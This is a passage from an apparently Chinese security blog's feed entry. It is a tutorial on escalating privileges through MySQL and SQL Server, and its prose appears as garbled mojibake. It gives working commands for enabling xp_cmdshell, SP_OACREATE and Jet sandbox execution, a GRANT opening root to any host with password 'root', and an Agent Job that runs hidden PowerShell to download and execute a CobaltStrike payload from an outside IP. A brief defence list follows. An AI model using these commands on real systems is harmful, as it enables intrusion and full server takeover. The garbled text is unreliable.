href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h1><p>å…ˆæ¥äº†è§£ä¸€ä¸‹æ€ä¹ˆæ‰èƒ½è·å–åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Ÿ<br>é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚ï¼šconnã€configã€dataã€sqlã€common ã€incæ–‡ä»¶ä¸­<br>å®‰è£…ç›®å½•ä¸‹ï¼Œå¦‚mysqlå®‰è£…ç›®å½•ä¸‹çš„user.MYDæ–‡ä»¶<br>ä½¿ç”¨Bruterå·¥å…·ç ´è§£â€”å‰ææ˜¯å¼€å¯äº†è¿œç¨‹è¿æ¥<br>ä½¿ç”¨è„šæœ¬æ–‡ä»¶è·å–</p><p><strong>æ€ä¹ˆæ‰“å¼€è¿œç¨‹è¿æ¥ï¼Ÿ</strong><br>rootè´¦æˆ·ä¸€èˆ¬åªèƒ½æœ¬åœ°è®¿é—®ï¼Œä½†åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯èƒ½éœ€è¦æ‰“å¼€rootçš„è¿œç¨‹è®¿é—®æƒé™ã€‚<br>ç™»å½•åˆ°mysqlä¸­ï¼Œä¸ºrootè¿›è¡Œè¿œç¨‹è®¿é—®çš„æˆæƒï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><pre><code>GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;flush privileges;</code></pre><p>ç¬¬ä¸€å¥ä¸­â€%â€è¡¨ç¤ºä»»ä½•ä¸»æœºéƒ½å¯ä»¥è¿œç¨‹ç™»å½•åˆ°è¯¥æœåŠ¡å™¨ä¸Šè®¿é—®ã€‚å¦‚æœè¦é™åˆ¶åªæœ‰æŸå°æœºå™¨å¯ä»¥è®¿é—®ï¼Œå°†å…¶æ¢æˆç›¸åº”çš„IPå³å¯<br>ç¬¬äºŒå¥è¡¨ç¤ºä»mysqlæ•°æ®åº“çš„grantè¡¨ä¸­é‡æ–°åŠ è½½æƒé™æ•°æ®ã€‚å› ä¸ºMySQLæŠŠæƒé™éƒ½æ”¾åœ¨äº†cacheä¸­ï¼Œæ‰€ä»¥åœ¨åšå®Œæ›´æ”¹åéœ€è¦é‡æ–°åŠ è½½ã€‚</p><p><strong>ææƒ</strong>:</p><h2 id="Mysqlææƒ"><a href="#Mysqlææƒ" class="headerlink" title="Mysqlææƒ"></a>Mysqlææƒ</h2><h3 id="udfææƒï¼š"><a href="#udfææƒï¼š" class="headerlink" title="udfææƒï¼š"></a>udfææƒï¼š</h3><p>é€šè¿‡åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¹mysqlåŠŸèƒ½è¿›è¡Œæ‰©å……ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œå°†mysqlè´¦å·rootè½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™ã€‚</p><h3 id="mofææƒï¼š"><a href="#mofææƒï¼š" class="headerlink" title="mofææƒï¼š"></a>mofææƒï¼š</h3><p>åœ¨windowså¹³å°ä¸‹ï¼Œc:/windows/system32/wbem/mof/nullevt.mof è¿™ä¸ªæ–‡ä»¶ä¼šæ¯é—´éš”ä¸€æ®µæ—¶é—´ï¼ˆå¾ˆçŸ­æš‚ï¼‰å°±ä¼šä»¥systemæƒé™æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬å°†æˆ‘ä»¬å…ˆè¦åšçš„äº‹é€šè¿‡ä»£ç å­˜å‚¨åˆ°è¿™ä¸ªmofæ–‡ä»¶ä¸­ï¼Œå°±å¯ä»¥å®ç°æƒé™æå‡ã€‚<br>å¯åŠ¨é¡¹ææƒï¼šå°†åé¢è„šæœ¬ä¸Šä¼ åˆ°ç³»ç»Ÿå¯åŠ¨ç›®å½•ï¼Œå½“æœåŠ¡å™¨é‡å¯å°±ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥è„šæœ¬ï¼Œä»è€Œè·å–ç³»ç»Ÿæƒé™ã€‚</p><h2 id="SQL-Server-ææƒ"><a href="#SQL-Server-ææƒ" class="headerlink" title="SQL Server ææƒ"></a>SQL Server ææƒ</h2><p>åˆ©ç”¨SQL Serceræ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¹Ÿæœ‰å¤šç§ï¼Œæ¯”å¦‚xp_cmdshellã€SP_OACREATEã€æ²™ç›’ã€Agent Jobã€CLRæ¥ææƒã€‚</p><h3 id="ä½¿ç”¨xp-cmdshellè¿›è¡Œææƒï¼š"><a href="#ä½¿ç”¨xp-cmdshellè¿›è¡Œææƒï¼š" class="headerlink" title="ä½¿ç”¨xp_cmdshellè¿›è¡Œææƒï¼š"></a>ä½¿ç”¨xp_cmdshellè¿›è¡Œææƒï¼š</h3><pre><code class="text"># å¯ç”¨xp_cmdshellEXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;# é€šè¿‡xp_cmdshellæ‰§è¡Œç³»ç»Ÿå‘½ä»¤Exec master.dbo.xp_cmdshell &#39;whoami&#39;</code></pre><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE:"></a>SP_OACREATE:</h3><pre><code class="text"># å¼€å¯ç»„ä»¶EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;# æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæ— å›æ˜¾ï¼‰declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami&#39;</code></pre><h3 id="é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤</h3><pre><code class="text"># å¼€å¯æ²™ç›’exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1# åˆ©ç”¨jet.oledbæ‰§è¡Œå‘½ä»¤select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h3 id="é€šè¿‡Agent-Jobæ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡Agent-Jobæ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤</h3><p>ä¿®æ”¹å¼€å¯Ageent Jobï¼Œæ‰§è¡Œæ— å›æ˜¾CobaltStrikeç”Ÿæˆpowershellä¸Šçº¿</p><pre><code class="text">USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.214.129:80/a&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</code></pre><p>æ•´ä½“æ€è·¯<br>1.é€šè¿‡å„ç§æ¼æ´æ‹¿åˆ°shell<br>2.æ‰¾ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼ˆæ‰¾è´¦å·ã€å¯†ç ï¼‰<br>3.ä½¿ç”¨ å·¥å…· ææƒ</p><p>æ•°æ®åº“é˜²å¾¡<br>1ã€é™æ­¢æ•°æ®åº“è¿œç¨‹è¿æ¥ï¼Œç»™æ•°æ®åº“å¸æˆ·è®¾ç½®å¯†ç å¿…é¡»&gt;8ä½ä»¥ä¸Šå¹¶æ•°å­—+å­—æ¯+ç‰¹æ®Šç¬¦å·ç­‰ã€‚<br>2ã€ä¸è¦ç»™ç½‘ç«™é…ç½®rootæˆ–SAæƒé™ã€‚å¿…é¡»ç»™æ¯ä¸ªç½‘ç«™ç‹¬ç«‹åˆ†é…æ•°æ®åº“å¸æˆ·å¹¶é™æ ¼æ§åˆ¶å¥½æƒé™ã€‚<br>3ã€åŠæ—¶å‡çº§æ•°æ®åº“è¡¥ä¸ã€‚<br>4ã€å®‰è£…Wafè¿›è¡Œé˜²å¾¡ã€‚<br>5ã€è´­ä¹°æ•°æ®åº“å®¡è®¡è®¾å¤‡ã€‚</p><p><strong>åŸºæœ¬è½¬è‡ªéšé£å¸ˆå‚…ï¼Œåšäº†ç‚¹å°å°æ”¹åŠ¨ï¼Œå› ä¸ºè‡ªå·±å¤ªèœäº†å†™ä¸å‡ºæ¥è¿™ä¹ˆå¥½çš„æ–‡ç« ï¼Œéšé£å¸ˆå‚…tql:<a href="https://www.cnblogs.com/sfsec/p/15162635.html">https://www.cnblogs.com/sfsec/p/15162635.html</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;ä¸ºä»€ä¹ˆè¦ææƒï¼šå½“æˆåŠŸé€šè¿‡80æˆ–è€…443ç«¯å£é€šè¿‡webæœåŠ¡æ¸—é€æ—¶ï¼Œå¸¸å¸¸æ˜¯www-data ã€‚æ— æ³•æ‰§è¡Œç®¡ç†å‘˜æƒé™ä¸‹çš„ä¸€ä¸‹å‘½ä»¤æˆ–è€…è¯»å–ä¸€äº›é‡è¦æ–‡ä»¶</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="windowsææƒ" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/windows%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="ææƒ" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
